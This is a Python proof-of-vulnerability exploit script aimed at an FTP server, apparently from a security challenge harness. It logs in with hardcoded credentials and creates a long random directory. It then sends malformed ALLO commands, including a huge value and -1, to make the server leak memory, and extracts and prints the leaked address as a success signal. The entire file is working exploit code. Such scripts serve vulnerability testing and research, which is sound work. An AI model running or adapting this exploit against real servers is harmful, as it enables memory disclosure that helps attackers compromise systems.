import sys
import os
import string
import random
import signal
from time import sleep
from threading import *
import socket

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def getPassword(username):
    file = open('cheatsheet', 'r')
    lines = file.readlines()
    for row in lines:
        if row.split(':')[1] == username:
            return row.split(':')[2].strip()

def login():
    pickUser = 'chess'
    userStr = 'USER ' + pickUser + '\r\n'
    ftp.sendall(userStr.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    passStr = 'PASS ' + 'chess' + '\r\n'
    ftp.send(passStr.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')

def displayResponse(reply):
    n = 2
    shex = 0
    for i in range(0, len(reply), n):
        charA = int(reply[i:i+2], 16)
        #print(str(charA) + " ", end='')
        if (charA >= 32 and charA < 127):
            if shex == 1:
                print('\' ', end='')
                shex = 0
            print(chr(charA), end='')
        else:
            if shex == 0:
                print(" \'\\x", end='')
                shex = 1
            print('{:02x}'.format(charA, 'x'), end='')
    if shex == 1:
        print("\'", end='')
    print ("")

def sendCommand(command):
    passStr = command + '\r\n'
    ftp.send(passStr.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')

def exploit():
    letters = string.ascii_letters
    newdir = ''.join(random.choice(letters) for i in range(127))
    sendCommand('SITE MKDIR ' + newdir)
    sendCommand('CWD ' + newdir)

    ftp.send('ALLO 4398046511104\r\n'.encode('utf-8'))
    reply = ftp.recv(4096).decode('utf-8')
    print(reply,end='')

    ftp.send('ALLO -1\r\n'.encode('utf-8'))
    reply = ftp.recv(4096).decode('utf-8')
    print(reply,end='')

    ftp.send('ALLO 1234\r\n'.encode('utf-8'))
    reply = ftp.recv(4096).decode('latin-1')
    print(reply)
    try:
        addressValue = reply.split(newdir)[1].split(')')[0][::-1].encode('latin-1').hex()
    except IndexError:
        print('[ERROR] POV Failed')
        sys.exit(1)
    else:
        if addressValue == '':
            print('[ERROR] POV Failed')
            sys.exit(1)
        print("ADDRESS=",end ='')
        print(addressValue)
        print('[SUCCESS] POV Succeeded')


def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    global ftp
    ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server = (HOST, PORT)
    ftp.connect(server)
    print(ftp.recv(4096).decode('utf-8'), end = '')
    login()
    exploit()

    ftp.close()
    sys.exit(0)

if __name__ == '__main__':
    main()
